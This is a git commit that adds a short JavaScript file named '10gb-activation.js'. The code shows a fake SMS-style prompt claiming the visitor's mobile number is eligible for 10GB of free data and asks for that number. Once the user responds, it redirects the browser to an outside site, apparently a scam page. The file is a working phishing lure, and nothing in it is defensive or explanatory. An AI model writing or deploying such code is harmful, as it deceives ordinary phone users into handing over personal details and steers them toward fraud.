1dca41e8d7bff0f0ffdb739957bd27d8bc8585db
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-19 00:49:22 +0100

    Create 10gb-activation.js

---
+++ 10gb-activation.js
@@ -0,0 +1,5 @@
+var password = 'MOBILE NUMBER'
+password=prompt('SMS: Congratulations, your mobile number is eligible to receive 10GB, click OK to Enter Your Mobile Number','MOBILE NUMBER');
+if (password != 'MOBILE NUMBER') {
+location.href='https://gbamz.com/10gb.html';
+}
